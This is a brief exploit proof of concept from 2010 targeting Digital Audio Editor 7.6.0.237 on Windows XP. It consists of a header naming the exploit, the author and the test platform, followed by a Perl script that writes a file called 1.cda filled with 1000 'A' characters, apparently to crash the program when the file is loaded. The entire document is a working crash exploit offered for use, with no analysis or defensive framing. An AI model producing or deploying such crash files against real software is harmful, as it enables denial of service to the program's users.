####
####
####Exploit Title: Digital Audio Editor 7.6.0.237 Local Crash PoC
####Software Link: http://www.audioeditor.us/dae/index.htm
####Tested on: Win XP SP3
####Date: 15-12-2010
####Author:  h1ch4m
####Email: h1ch4m@live.fr
####
####

my $file= "1.cda";
my $junk = "\x41" x 1000;
open($FILE,">$file");
print $FILE $junk;
close($FILE);
print "File Created successfully\n";
sleep(1);